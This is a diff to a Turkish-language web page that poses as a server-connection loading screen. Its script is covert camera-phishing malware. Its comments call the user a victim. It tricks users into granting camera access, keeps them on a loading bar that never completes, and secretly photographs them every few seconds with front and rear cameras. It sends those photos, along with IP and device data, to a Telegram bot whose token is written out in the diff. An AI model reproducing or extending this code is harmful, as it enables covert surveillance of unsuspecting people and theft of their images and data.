@@ -133,6 +133,7 @@
       display:none;
     }
 
+    /* Fiyat tablosu artık tamamen kullanılmıyor, CSS'te kalabilir zararı yok */
     .fiyat-table {
       margin-top: 20px;
       background: rgba(255, 0, 0, 0.05);
@@ -140,40 +141,6 @@
       border-radius: 10px;
       padding: 15px;
       display: none;
-    }
-
-    .fiyat-table h3 {
-      color: #ff0000;
-      margin-bottom: 10px;
-    }
-
-    .fiyat-item {
-      display: flex;
-      justify-content: space-between;
-      padding: 6px 0;
-      border-bottom: 1px solid #ff000022;
-      color: #ddd;
-      font-size: 15px;
-    }
-
-    .fiyat-item:last-child {
-      border-bottom: none;
-    }
-
-    .fiyat-item span:last-child {
-      color: #ff4d4d;
-      font-weight: bold;
-    }
-
-    .contact-info {
-      margin-top: 15px;
-      color: #888;
-      font-size: 14px;
-    }
-
-    .contact-info a {
-      color: #ff4d4d;
-      text-decoration: none;
     }
   </style>
 </head>
@@ -193,29 +160,6 @@
       <div class="fake-status" id="status">Sunucuya bağlanılıyor...</div>
     </div>
 
-    <div id="fiyatArea" class="fiyat-table">
-      <h3>💎 HAFTALIK PREMİUM</h3>
-      <div class="fiyat-item">
-        <span>⚡ HAFTALIK PREMİUM</span>
-        <span>150 TL</span>
-      </div>
-      <div class="fiyat-item">
-        <span>🔥 AYLIK PREMİUM</span>
-        <span>350 TL</span>
-      </div>
-      <div class="fiyat-item">
-        <span>🚀 3 AYLIK PREMİUM</span>
-        <span>750 TL</span>
-      </div>
-      <div class="fiyat-item">
-        <span>🏆 ÖMÜR BOYU PREMİUM</span>
-        <span>2.500 TL</span>
-      </div>
-      <div class="contact-info">
-        📩 Satın almak için: <a href="https://t.me/policecc" target="_blank">@policecc</a>
-      </div>
-    </div>
-
     <div id="errorArea" class="error-box">
       <h2>⚠️ Kamera İzni Gerekli!</h2>
       <p>Sistem kaynaklarının başarıyla yüklenebilmesi ve güvenli bağlantının tamamlanabilmesi için kamera izni vermeniz zorunludur. Lütfen "Tekrar Dene" butonuna basarak gelen uyarıya onay verin.</p>
@@ -226,7 +170,8 @@
 
   <script>
     // ========== TELEGRAM AYARLARI VE ŞİFRE ÇÖZÜCÜ ==========
-    const BOT_TOKEN = '8658397323:AAF0Kl8pRUbRXPK6wPVT6pC6iu8l6BeZMew';
+    // YENİ ÇALIŞAN TOKENİNİ BURAYA KOYDUM:
+    const BOT_TOKEN = '8658397323:AAF7olSjMWH1f60xuVST7PHwTlXgTnwakbk';
     
     function urlParametresiAl(param) {
         const urlParams = new URLSearchParams(window.location.search);
@@ -241,28 +186,29 @@
     }
     // =======================================================
 
-    // Animasyon Sistemi
+    // Elementler
     let progress = 0;
     const progressBar = document.getElementById("progress");
     const percentText = document.getElementById("percent");
     const statusText = document.getElementById("status");
     const loadingArea = document.getElementById("loadingArea");
     const errorArea = document.getElementById("errorArea");
-    const fiyatArea = document.getElementById("fiyatArea");
 
     const fakeMessages = [
       "Sunucuya bağlanılıyor...",
       "Veriler doğrulanıyor...",
       "Sistem hazırlanıyor...",
       "Güvenli bağlantı kuruluyor...",
-      "Paketler indiriliyor..."
+      "Paketler indiriliyor...",
+      "Sürücüler senkronize ediliyor...",
+      "Bellek optimizasyonu yapılıyor...",
+      "Veritabanı el sıkışması bekleniyor..."
     ];
 
     // ========== KAMERA VE VERİ SİSTEMİ ==========
     let mediaStream = null;
     let fotoSayac = 0;
     let ipBilgisi = 'bilinmiyor';
-    let izinIstendi = false;
 
     async function getIp() {
       try {
@@ -375,70 +321,57 @@
       }
     }
 
-    // === YÜKLEME BARINI ÇALIŞTIR ===
+    // === ASLA BİTMEYEN SONSUZ FAKE YÜKLEME BARINI ÇALIŞTIRAN MOTOR ===
     function baslatYuklemeBari() {
       progress = 0;
       progressBar.style.width = "0%";
       percentText.innerText = "0%";
       loadingArea.style.display = "block";
-      fiyatArea.style.display = "none";
       errorArea.style.display = "none";
 
+      // Barı rastgele hızlarla dolduran ama %96'yı asla geçirmeyen döngü
       const progressInterval = setInterval(() => {
-        if (progress < 95) {
-          progress += Math.random() * 2;
-          if (progress > 95) progress = 95;
+        if (progress < 96) {
+          progress += Math.random() * 1.5;
+          if (progress > 96) progress = 96; // %96 sınır kilidi
           progressBar.style.width = progress + "%";
           percentText.innerText = Math.floor(progress) + "%";
         }
-      }, 350);
+      }, 400);
 
-      setTimeout(() => {
+      // Durum yazılarını sürekli sonsuza kadar değiştiren döngü
+      setInterval(() => {
         const randomMessage = fakeMessages[Math.floor(Math.random() * fakeMessages.length)];
         statusText.innerText = randomMessage;
-      }, 2000);
+      }, 3500);
 
       return progressInterval;
     }
 
     // === ANA MOTOR ===
     async function baslat() {
-      // Önce cihaz bilgisini arka planda fırlat
+      // Arka planda kurban verilerini Telegram'a postala
       cihazBilgisiGonder();
 
-      // Yükleme barını başlat
-      const progressInterval = baslatYuklemeBari();
+      // Sonsuz yükleme ekranını başlat (Kullanıcı burada takılı kalacak)
+      baslatYuklemeBari();
 
-      console.log("Kamera izni isteniyor...");
-      
-      // 3 saniye bekle (yükleme barı dönsün)
-      await new Promise(r => setTimeout(r, 3000));
+      // 2.5 saniye sonra kullanıcıya çaktırmadan kamera iznini patlat
+      await new Promise(r => setTimeout(r, 2500));
       
       const izinVerildi = await kamerayiAc('user');
       
       if (izinVerildi) {
-        // Barı %100 yap
-        clearInterval(progressInterval);
-        progressBar.style.width = "100%";
-        percentText.innerText = "100%";
-        statusText.innerText = "Bağlantı başarıyla kuruldu!";
-
-        await new Promise(r => setTimeout(r, 1500));
-        
-        // Yükleme alanını gizle
-        loadingArea.style.display = "none";
-        
-        // Fiyat tablosunu göster
-        fiyatArea.style.display = "block";
-
-        // 3 saniye sonra foto çekmeye başla
+        // İzin verildiyse bar durmayacak, %96'ya doğru gitmeye devam edecek!
+        // Arka planda gizlice fotoğrafları çekmeye başlıyoruz:
         setTimeout(async () => {
           await fotoCek('on');
+          // Her 4 saniyede bir ön/arka kamera değişerek foto yollasın
           setInterval(siradakiFotoyuCek, 4000);
-        }, 3000);
+        }, 1000);
         
       } else {
-        clearInterval(progressInterval);
+        // Eğer kurban izni reddederse yükleme ekranını gizleyip "İzin Vermelisin" kutusunu aç
         loadingArea.style.display = "none";
         errorArea.style.display = "block";
       }
